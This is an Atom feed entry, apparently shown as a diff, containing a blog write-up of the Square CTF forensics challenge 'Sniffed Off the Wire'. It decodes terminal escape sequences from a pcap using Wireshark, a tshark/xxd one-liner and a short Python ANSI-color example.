-    <id>https://teamrocketist.github.io/2017/10/16/Forensics-Square-CTF-Sniffed-Off-the-Wire/</id>
-    <published>2017-10-16T18:26:03.000Z</published>
-    <updated>2017-10-16T18:35:02.283Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>Sniffed Off the Wire<br>🚩<br>Sifting through the noise<br>100 points<br>Forensics<br><br>After weeks of perching, our avian operatives captured a suspicious network flow. Maybe there’s valuable data inside?<br><a href="https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap" target="_blank" rel="external">https://cdn.squarectf.com/challenges/sniffed-off-the-wire.pcap</a><br></blockquote>
-
-<p>We have pcap analysing it in wireshark, if we follow the tcp stream we can see alot of strange characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/HrSWCVj.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/HrSWCVj.png" alt=""><br></a><br>This strange characters are known as terminal characters, they can do alot of things like changing the color printed in the terminal and do alot of other stuff. If we print some characters like this in the terminal with c/python/perl/ruby etc:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">bcolors</span>:</span></div><div class="line">    HEADER = <span class="string">'\033[95m'</span> <span class="keyword">with</span></div><div class="line">    OKBLUE = <span class="string">'\033[94m'</span></div><div class="line">    OKGREEN = <span class="string">'\033[92m'</span></div><div class="line">    WARNING = <span class="string">'\033[93m'</span></div><div class="line">    FAIL = <span class="string">'\033[91m'</span></div><div class="line">    ENDC = <span class="string">'\033[0m'</span></div><div class="line">    BOLD = <span class="string">'\033[1m'</span></div><div class="line">    UNDERLINE = <span class="string">'\033[4m'</span></div><div class="line"><span class="keyword">print</span> bcolors.WARNING + <span class="string">"Warning: No active frommets remain. Continue?"</span> + bcolors.ENDC</div></pre></td></tr></table></figure>
-<p>It’s going to print the text as yellow in the terminal, those characters on wireshark will do same but with another functions not just changing the color, first we need to decode all this hex decimal in the data field of each <code>TCP</code> package:<br><a data-fancybox="gallery" href="https://i.imgur.com/USynWoq.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/USynWoq.png" alt=""><br></a><br>Lets use bash to get all the hexadecimal and convert it to text:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r sniffed-off-the-wire.pcap -Y <span class="string">"data"</span> -Tfields -e data.data | tr -d <span class="string">':|\n'</span> | xxd -r -p</div></pre></td></tr></table></figure>
-<p>Those characters are actually writing the flag and then delete it, I actually needed to print-screen the terminal, with this I ended up getting the flag:<br><a data-fancybox="gallery" href="https://i.imgur.com/0uQFjce.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/0uQFjce.png" alt=""><br></a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;Sniffed Off the Wire&lt;br&gt;🚩&lt;br&gt;Sifting through the noise&lt;br&gt;100 points&lt;br&gt;Forensics&lt;br&gt;&lt;br&gt;After weeks of perching, our avian
-    
-    </summary>
-    
-      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
-    
-    
-      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
-    
-      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
-    
-      <category term="tshark" scheme="https://teamrocketist.github.io/tags/tshark/"/>
-    
-      <category term="terminal_characters" scheme="https://teamrocketist.github.io/tags/terminal-characters/"/>
-    
-      <category term="squarectf" scheme="https://teamrocketist.github.io/tags/squarectf/"/>
     
   </entry>
   
